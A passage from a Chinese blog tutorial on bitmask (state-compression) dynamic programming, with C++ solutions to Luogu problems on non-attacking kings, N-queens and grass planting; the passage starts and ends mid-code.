dp[maxn][maxn];</span><br><span class="line"><span class="type">int</span> s[maxn][maxn];</span><br><span class="line"><span class="type">int</span> prefix[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        s[i][i]=i;</span><br><span class="line">        dp[i][i]=<span class="number">0</span>;</span><br><span class="line">        prefix[i]=prefix[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> delta=<span class="number">1</span>;delta&lt;=n;++delta)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i=<span class="number">1</span>;i+delta&lt;=n;++i)&#123;</span><br><span class="line">            <span class="keyword">auto</span> j=i+delta;</span><br><span class="line">            <span class="type">int</span> temp_min=INF;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(dp[i][k]+dp[k<span class="number">+1</span>][j]&lt;temp_min)&#123;</span><br><span class="line">                    temp_min=dp[i][k]+dp[k<span class="number">+1</span>][j];</span><br><span class="line">                    s[i][j]=k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j]=temp_min+prefix[j]-prefix[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;dp[<span class="number">1</span>][n]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至于四边形不等式的正确性,现在还没有完全转阴,啥时候脑子不浑了再看吧...</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/22/%E7%8A%B6%E5%8E%8BDP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/22/%E7%8A%B6%E5%8E%8BDP/" class="post-title-link" itemprop="url">动态规划-状压DP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-22 23:48:00" itemprop="dateCreated datePublished" datetime="2022-12-22T23:48:00+08:00">2022-12-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-06-01 09:38:00" itemprop="dateModified" datetime="2023-06-01T09:38:00+08:00">2023-06-01</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="动态规划-状压dp">动态规划-状压DP</h1>
<p>状态压缩DP,也就是把局面状态压缩到一个整数中,用整数的运算表示状态转移</p>
<p>模板题一般是,往棋盘上放同一种棋子,并且不能让他们掐架,问题有两种:</p>
<p>一共要放k个,求放法有几种?</p>
<p>最多放多少个?</p>
<p><code>g++ -std=c++11 -O2</code></p>
<h2 id="p1896-八王八"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1896">P1896 八王八</a></h2>
<p>一个<span class="math inline">\(N\times N\)</span>的国象棋盘上放<span
class="math inline">\(k\)</span>个王八,要求这k个王八不能掐架.求有多少种放王八的方法</p>
<p>其中<span class="math inline">\(1\leq N\leq 9,0\leq k\leq N\times
N\)</span></p>
<p>类似于八皇后问题,但是王八的攻击范围只有周围八格,更近</p>
<h3 id="状态压缩">状态压缩</h3>
<p>棋盘的每个格子,要么有王八,要么没王八,因此
可以用1表示有,0表示无的状态</p>
<p>那么整个棋盘可以看成有N行,每行有N个格子</p>
<p>比如一个<span class="math inline">\(4\times
4\)</span>,没有王的棋盘就可以是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br></pre></td></tr></table></figure>
<p>可以将一行压缩为一个整数,最左侧是最低位比如</p>
<p>1 0 0 1 0 1 0 -&gt;0101001b=41</p>
<p>如果想让一行中的王八不掐架,那么不能有任何两个1相邻.这一点怎么判断呢?</p>
<p>假设current_state=41表示当前行状态</p>
<p>那么<code>(current_state&amp;((current_state&gt;&gt;1)|current_state&lt;&lt;1))</code>就可以判断有没有王八掐架</p>
<p>为啥呢?</p>
<p>比如状态41显然是合法的</p>
<table>
<colgroup>
<col style="width: 83%" />
<col style="width: 6%" />
<col style="width: 10%" />
</colgroup>
<thead>
<tr>
<th>状态</th>
<th>整数</th>
<th>二进制</th>
</tr>
</thead>
<tbody>
<tr>
<td>current_state</td>
<td>41</td>
<td>0101001</td>
</tr>
<tr>
<td>current_state&lt;&lt;1</td>
<td></td>
<td>1010010</td>
</tr>
<tr>
<td>current_state&gt;&gt;1</td>
<td></td>
<td>0010100</td>
</tr>
<tr>
<td>(current_state&lt;&lt;1)|(current_state&gt;&gt;1)</td>
<td></td>
<td>1010110</td>
</tr>
<tr>
<td>current_state</td>
<td></td>
<td>0101001</td>
</tr>
<tr>
<td>(current_state&amp;((current_state&gt;&gt;1)|(current_state&lt;&lt;1))</td>
<td></td>
<td>0000000</td>
</tr>
</tbody>
</table>
<p>如何让相邻两行的王八不掐架呢?</p>
<p><code>(current_state&amp;((previous_state)|(previous_state&lt;&lt;1)|(previous_state&gt;&gt;1)))</code></p>
<p>道理类似于不让一行中的王八掐架,上一行的一个王八,那么本行中该王八的左下,正下,右下都不能有王八</p>
<h3 id="状态转移">状态转移</h3>
<p>设计状态:</p>
<p><code>dp[currnet_row][cnt_king_used][current_state]</code>表示:</p>
<p>已经安排了<code>[1,current_row]</code>的王八,</p>
<p>已经安排了<code>cnt_king_used</code>个王八,</p>
<p>当前行,也就是第<code>current_row</code>的状态是<code>current_state</code></p>
<p>状态转移方程: <span class="math display">\[
\begin{aligned}
&amp;dp[current\_row][cnt\_king\_used][current\_state]=\\
&amp;\sum_{previous\_state}dp[previous\_row][cnt\_kings\_used-cnt\_kings\_of[current\_row]\
][previous\_state]
\end{aligned}
\]</span> 初始状态:</p>
<p>前0行(不存在这一行),放了0个王八,状态显然是0,此时的摆放方法<code>dp[0][0][0]=0</code></p>
<h3 id="完整程序">完整程序</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dp[<span class="number">10</span>][<span class="number">100</span>][<span class="number">2000</span>];<span class="comment">//dp[i][j][k]前i行中已经摆了j个王,其中第i行的状态是k.的数量</span></span><br><span class="line"><span class="type">int</span> n,k;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;legal_states;</span><br><span class="line"><span class="type">int</span> cnt_kings_in_state[<span class="number">2000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isLegalState</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((k&amp;((k&lt;&lt;<span class="number">1</span>)|(k&gt;&gt;<span class="number">1</span>)))==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isInvasion</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a,<span class="type">const</span> <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a&amp;((b&lt;&lt;<span class="number">1</span>)|(b&gt;&gt;<span class="number">1</span>)|b));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="type">int</span> current_state;</span><br><span class="line">    <span class="type">int</span> cnt_state;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;n);i++)&#123;</span><br><span class="line">        current_state=i;</span><br><span class="line">        cnt_state=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(current_state)&#123;</span><br><span class="line">            cnt_state+=current_state&amp;<span class="number">1</span>;</span><br><span class="line">            current_state&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt_kings_in_state[i]=cnt_state;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isLegalState</span>(i))&#123;</span><br><span class="line">            legal_states.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> current_row=<span class="number">1</span>;current_row&lt;=n;current_row++)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:legal_states)&#123;<span class="comment">//当前行合法状态</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_state:legal_states)&#123;<span class="comment">//上一行的合法状态</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isInvasion</span>(current_state,previous_state)==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(</span><br><span class="line">                        <span class="type">int</span> cnt_tot_kings=cnt_kings_in_state[current_state];</span><br><span class="line">                        cnt_tot_kings&lt;=k;</span><br><span class="line">                        ++cnt_tot_kings</span><br><span class="line">                    )&#123;</span><br><span class="line">                        </span><br><span class="line">                        dp[current_row][cnt_tot_kings][current_state]+=</span><br><span class="line">                            dp[previous_row][cnt_tot_kings-cnt_kings_in_state[current_state]][previous_state];</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:legal_states)&#123;</span><br><span class="line">        result+=dp[n][k][current_state];</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="section"></h3>
<h2 id="p1219-八皇后"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1219">P1219 八皇后</a></h2>
<p><span class="math inline">\(N\times
N\)</span>的棋盘上要放N的皇后,要求N个皇后不能掐架,求多少种放皇后的方法</p>
<p><span class="math inline">\(6\leq N\leq 13\)</span></p>
<h3 id="状态压缩-1">状态压缩</h3>
<p>N行,每行N位,每位0表示没有皇后,1表示有皇后</p>
<p>一个int有32位,足够表示一行</p>
<p>每行的最左侧格子是int的最低位</p>
<h3 id="状态转移-1">状态转移</h3>
<p>设计状态</p>
<p><span
class="math inline">\(dfs(col\_state,diagonal\_state,rdiagonal\_state,row)\)</span></p>
<p>表示当前要放第row行的皇后,</p>
<p>之前所有的皇后控制的所有列存放在<code>col_state</code>中,</p>
<p>之前所有皇后控制的左上到右下的斜线<strong>在本行的影响</strong>存放在<code>diagonal_state</code>中</p>
<p>之前所有皇后控制的右上到左下的斜线在本行的影响存放在<code>人diagonal_state</code>中</p>
<p>显然<span
class="math inline">\(dfs(col\_state,diagonal\_state,rdiagonal\_state,row)\)</span>的任务就是,结合前三个参数,在本行找一个安全位置放一个皇后,然后进入下一层dfs</p>
<p>啥意思呢?8</p>
<p>假如现在要放第四行,前三行的皇后如图所示</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114520664.png"
alt="image-20221222114520664" />
<figcaption aria-hidden="true">image-20221222114520664</figcaption>
</figure>
<p>这三个皇后控制的列对第四行的影响如图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114303317.png"
alt="image-20221222114303317" />
<figcaption aria-hidden="true">image-20221222114303317</figcaption>
</figure>
<p>那么此时第四行的2,4,6列就不允许放皇后,</p>
<p>此时<code>col_state=00101010b</code>,(最左侧格子在最低位)表示第2,4,6列不允许使用</p>
<p>前三个皇后在左上到右下的斜线上,对第四行产生的影响如图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114701433.png"
alt="image-20221222114701433" />
<figcaption aria-hidden="true">image-20221222114701433</figcaption>
</figure>
<p>即此时<code>diagonal_state=01110000</code>(最左侧格子在最低位),表示第5,6,7列不允许使用</p>
<p><code>rdiagonal_state</code>同理</p>
<p>下面考虑这三个表示占用状态的参数如何维护</p>
<p>显然col_state最容易维护,只要第i列上有过皇后,col_state的相应二进制位就置1</p>
<p>对于diagonal_state,假设本行的皇后放在第i列,那么他会影响下一行的i+1列,因此从当前行的dfs进入下一行的dfs时,只需要把diagonal_state加上本行的皇后列位置,然后右移1位传递给下层dfs</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222150322875.png"
alt="image-20221222150322875" />
<figcaption aria-hidden="true">image-20221222150322875</figcaption>
</figure>
<p>综上,对于当前行的dfs,放置皇后时需要考虑的因素如图:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222150632385.png"
alt="image-20221222150632385" />
<figcaption aria-hidden="true">image-20221222150632385</figcaption>
</figure>
<p>状态转移方程采用"推"的方式,从row层推进到row+1层 <span
class="math display">\[
\begin{aligned}
&amp;dfs(col\_state,diagonal\_state,rdiagonal\_state,row)\\ \Rightarrow
&amp;dfs(col\_state|current\_state,(diagonal\_state|current\_state)&gt;&gt;1,(rdiagonal\_state|current\_state)&lt;&lt;1,row+1)
\end{aligned}
\]</span></p>
<h3 id="完整代码">完整代码</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> log_2[<span class="number">10000</span>];</span><br><span class="line"><span class="type">int</span> cnt_success=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> limit_state;</span><br><span class="line"><span class="type">int</span> col[maxn];<span class="comment">//第i行放在第col[i]列上</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> &amp;x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);<span class="comment">//-x为取补,~x为按位取反</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i)&#123;</span><br><span class="line">        cout&lt;&lt;col[i]<span class="number">+1</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> column_state,<span class="type">int</span> diagonal_state,<span class="type">int</span> rdiagonal_state,<span class="type">int</span> row)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(row&gt;n)&#123;</span><br><span class="line">        ++cnt_success;</span><br><span class="line">        <span class="keyword">if</span>(cnt_success&lt;=<span class="number">3</span>)&#123;<span class="comment">//打印前三个排列</span></span><br><span class="line">            <span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> capture_state=(column_state|diagonal_state|rdiagonal_state)&amp;limit_state;</span><br><span class="line">    <span class="type">int</span> available_state=(~capture_state)&amp;limit_state;<span class="comment">//~按位取反,</span></span><br><span class="line">    <span class="type">int</span> position_state;</span><br><span class="line">    <span class="type">int</span> position;</span><br><span class="line">    <span class="keyword">while</span>(available_state)&#123;</span><br><span class="line">        position_state=<span class="built_in">lowbit</span>(available_state);<span class="comment">//lowbit每次先尝试最低位,保证了得到结果的顺序是按照字典序的</span></span><br><span class="line">        position=log_2[position_state];</span><br><span class="line">        col[row]=position;</span><br><span class="line">        <span class="built_in">dfs</span>(column_state|position_state,(diagonal_state|position_state)&gt;&gt;<span class="number">1</span>,(rdiagonal_state|position_state)&lt;&lt;<span class="number">1</span>,row<span class="number">+1</span>);</span><br><span class="line">        available_state-=position_state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    limit_state=(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;<span class="comment">//规定yi&#x27;man</span></span><br><span class="line">    log_2[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;<span class="number">10000</span>;i++)&#123;<span class="comment">//初始化log_2对数函数</span></span><br><span class="line">        log_2[i]=log_2[i/<span class="number">2</span>]<span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;cnt_success&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p1879-八将军"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1879">P1879 八将军</a></h2>
<p><span class="math inline">\(M\times N\)</span>个格子的矩形地面</p>
<p>然后输入<span class="math inline">\(M\times
N\)</span>个数表明这个地面是否肥沃,1肥沃,0贫瘠</p>
<p>其中<span class="math inline">\(1\leq M,N\leq 12\)</span></p>
<p>肥沃的土地可以种草,贫瘠的不行</p>
<p>任何两个草地不能有相邻边,可以有相邻顶角</p>
<p>求有多少种安排方法</p>
<p>问题可以向八王八靠拢,如果种草地可以视为占了一个中国象棋的将军,前后左右四个格子内不允许有第二个将军.贫瘠的格子不允许放棋</p>
<p>如果八王八问题中也有一些棋盘不允许放置棋子则和本题就很相似了</p>
<h3 id="状态压缩-2">状态压缩</h3>
<p>一行最多有12个格子,每个格子要么种草,要么不中,一个二进制位两种状态表示一个格子即可,那么一行只需要12个二进制位,显然一个int有32位足够表示一行的状态</p>
<p>贫瘠的格子如何建模?贫瘠的格子不允许种草就行了呗</p>
<h3 id="状态转移-2">状态转移</h3>
<p>类比八国王问题,设计dp状态 <span class="math display">\[
dp[current\_row][current\_state]
\]</span> 表示:</p>
<p>已经安排了[1,current_row]行,</p>
<p>其中第current_row行的状态是current_stata,</p>
<p>满足上述两个条件的不同安排数目是<code>dp[current_row][current_state]</code></p>
<p>状态转移方程是 <span class="math display">\[
dp[current\_row][current\_state]=\\
\sum_{previous\_state}dp[previous\_row][previous\_state]
\]</span>
这里要求<code>previous_state</code>和<code>current_state</code>两个状态不能相互冲突,也就是上一行的种草格子,下一行这个格子不允许种草</p>
<h3 id="完整代码-1">完整代码</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> row_base_state[maxn];<span class="comment">//输入一行土地贫瘠状态之后压缩成一个整数,row_base_state[i]表示第i行的地皮是贫瘠还是肥沃</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; row_legal_state[maxn];<span class="comment">//ro_legal_state[i]表示第i行的所有合法状态集合(同行内没有相邻草地并且考虑贫瘠土地)</span></span><br><span class="line"><span class="type">int</span> row_limit_state;<span class="comment">//行状态上限</span></span><br><span class="line"><span class="type">int</span> dp[maxn][<span class="number">1000000</span>];<span class="comment">//dp[current_row][current_state],第1到current_row行都已经安排,其中第current_row行的状态是current_state</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;<span class="comment">//m行,每行有n列</span></span><br><span class="line">    row_limit_state=(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;<span class="comment">//行状态上限</span></span><br><span class="line">    <span class="type">int</span> single_state;<span class="comment">//用于承载一个格子的状态</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;<span class="comment">//获取输入压缩到row_base_state</span></span><br><span class="line">        <span class="type">int</span> row_state=<span class="number">0</span>;<span class="comment">//用于压缩一行的状态</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            cin&gt;&gt;single_state;</span><br><span class="line">            <span class="comment">//最先输入的格子权位最高,也就是说最左侧的格子在状态的最高二进制位</span></span><br><span class="line">            row_state=row_state*<span class="number">2</span>+single_state;<span class="comment">//行状态=刚才的行状态左移一位加上新格子的状态</span></span><br><span class="line">        &#125;</span><br><span class="line">        row_base_state[i]=row_state;<span class="comment">//计算得出了第i行的压缩状态</span></span><br><span class="line">        <span class="keyword">for</span>(row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;++row_state)&#123;<span class="comment">//计算第i行的所有合法种草状态,第i行的每种合法种草状态都放到row_legal_state[i]中</span></span><br><span class="line">            <span class="keyword">if</span>((row_state&amp;((row_state&lt;&lt;<span class="number">1</span>)|(row_state&gt;&gt;<span class="number">1</span>)))==<span class="number">0</span> &amp;&amp; ((row_state&amp;((~row_base_state[i])&amp;row_limit_state))==<span class="number">0</span>))&#123;</span><br><span class="line">                row_legal_state[i].<span class="built_in">push_back</span>(row_state);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;<span class="comment">//设置dp初始条件,啥也不种的状态只有一种</span></span><br><span class="line">    row_legal_state[<span class="number">0</span>].<span class="built_in">push_back</span>(<span class="number">0</span>);<span class="comment">//第0行没有任何合法状态</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_row=<span class="number">1</span>;current_row&lt;=m;++current_row)&#123;<span class="comment">//</span></span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_row_state:row_legal_state[current_row])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_row_state:row_legal_state[previous_row])&#123;</span><br><span class="line">                <span class="keyword">if</span>((current_row_state&amp;previous_row_state)==<span class="number">0</span>)&#123;<span class="comment">//两行不能冲突</span></span><br><span class="line">                    